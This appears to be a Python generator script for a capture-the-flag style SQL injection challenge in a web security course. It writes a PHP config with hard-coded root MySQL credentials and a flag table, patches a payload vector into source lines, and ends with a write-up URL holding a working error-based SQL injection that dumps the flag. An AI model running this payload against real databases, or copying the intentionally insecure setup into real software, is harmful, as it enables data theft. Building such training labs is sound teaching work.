# -*- coding: utf-8 -*-

import re
import os

from .refObject import refObject
from .sourceHelper import sourceHelper

"""
When your class inherits from refObject, you are available to use all methods and members from module's instance in @staticmethod functions, such as:
    self.fp: Instance of filePointer
    self.payloads: Payloads of loaded module
"""


class instanceSample(refObject):
    """This script generates a web challenge for pre-exam of Web Security Basic."""

    # Because main(self) is an entry function, every initialization should be
    # setup here.
    def main(self):
        # Use mod_unfilter as base module.
        self.gen_instance.parse("set modules = +sqli")
        # Use MySQL as DBMS
        self.gen_instance.parse("set dbms = MySQL")
        self.gen_instance.parse("set expose = 8085")

    @staticmethod
    def __call__(self):
        # mysql2.config.php
        config = """
        <?php
            // Configuration
            $dbhost = 'mysql';
            $dbuser = 'root';
            $dbpass = 'root_password';
            $dbname = 'root_mysql';
            $flag_table = 'flags';

            // Connect to mysql database
            $conn = mysql_connect($dbhost, $dbuser, $dbpass) or die('Error with MySQL connection');
            mysql_query("SET NAMES 'utf8'");
            
            mysql_select_db($dbname);

            // Check if flags table created
            $sql = "SELECT flag from $flag_table";
            $result = mysql_query($sql);

            // Create a new flags table if empty
            if(empty($result)) {
                $sql = "CREATE TABLE $flag_table ( id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY, flag VARCHAR(30) NOT NULL )";
                mysql_query($sql) or die('MySQL query error');

                // Insert a flag to flags
                $sql = "INSERT INTO $flag_table (flag) VALUES ('FLAG{4rr0r_e66o6}')";
                mysql_query($sql) or die('MySQL INSERT query error');
            }

            // Check if users table created
            $sql = "SELECT last_name from users";
            $result = mysql_query($sql);

            // Create a new users table if empty
            if(empty($result)) {
                $sql = "CREATE TABLE users ( id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY, first_name VARCHAR(30) NOT NULL, last_name VARCHAR(30) )";
                mysql_query($sql) or die('MySQL query error');

                // Insert datas to users
                $sql = "INSERT INTO users (first_name, last_name) VALUES ('Su', 'Boik')";
                mysql_query($sql) or die('MySQL INSERT query error');

                $sql = "INSERT INTO users (first_name, last_name) VALUES ('Ad', 'Admin')";
                mysql_query($sql) or die('MySQL INSERT query error');
            }
        ?>
        """

        self.fp.write(os.path.join(self.fp.path, "mysql2.config.php"),
                      config, ext=None)

    @staticmethod
    def generateHandler(self, tree_node=None, o=None, elem=None):
        """
        tree_node: An ElementTree for the root node of the preprocessing file(line number included) in this context.
        o: Original unpreprocessing file
        elem: Entries of infos of staged nodes
        """
        if elem['type'] != "attrval":
            o[int(elem['lineno']) - 1] = re.sub(r'(.*)<{0}>(.*)</{0}>(.*)'.format(elem['identifier']), lambda m: "{0}{1}{2}".format(m.group(
                1), self.payloads['payloads'][1]['vector'].replace('{0}', 'mysql2.config.php').replace('{1}', m.group(2)), m.group(3)), o[int(elem['lineno']) - 1], flags=re.IGNORECASE)
        else:
            o[int(elem['lineno']) - 1] = re.sub(r'(.*)#+<{0}>(.*)</{0}>(.*)'.format(elem['identifier']), lambda m: "{0}{1}{2}".format(m.group(
                1), self.payloads['payloads'][1]['vector'].replace('{0}', 'mysql2.config.php').replace('{1}', m.group(2)), m.group(3)), o[int(elem['lineno']) - 1], flags=re.IGNORECASE)
        self.settings[
            'cmd'] = 'rm -f php.ini README.md && mkdir static && cd static && echo "Hel10_wor14" > flag.txt'

"""
Write up:
    - http://127.0.0.1:8085/?To_Meet=' or (select 1 from (select count(*), concat((select(select concat(flag, 0x7e)) from flags limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--%20(注意最後面有一個空格)
"""
